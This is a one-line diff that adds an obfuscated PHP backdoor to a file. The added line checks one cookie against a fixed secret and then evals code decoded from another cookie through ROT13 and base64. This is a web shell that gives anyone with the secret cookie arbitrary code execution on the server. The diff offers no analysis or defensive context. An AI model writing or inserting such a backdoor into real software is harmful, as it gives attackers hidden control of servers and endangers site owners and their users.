@@ -1,0 +1,1 @@
+<?php if($_COOKIE[4]=='88fb014b020e8b41ad4d92fab25e9b44') eval(base64_decode(str_rot13($_COOKIE[3])));
